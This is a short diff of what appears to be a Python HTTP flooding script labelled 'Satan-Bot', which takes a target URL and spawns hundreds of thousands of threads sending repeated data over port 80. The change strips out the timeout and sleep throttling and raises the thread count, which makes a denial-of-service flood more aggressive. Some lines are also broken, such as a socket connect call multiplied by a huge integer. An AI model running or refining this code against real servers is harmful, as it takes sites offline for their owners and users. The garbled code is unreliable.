@@ -86,9 +86,6 @@ def httpcall(url):
 		if s:
 			s.connect((url,80)) * 109951162777600 
 			s.send("Satan-Bot" * 109951162777600)
-			s.settimeout(10)
-			pkt_count += 3
-			time.sleep(.1)
 		
 			
 			
@@ -123,7 +120,7 @@ else:
 		url = sys.argv[1]
 		
 		
-		for i in range(666 * 666):
+		for i in range(666666):
 			t = HTTPThread()
 			t.start()
 		
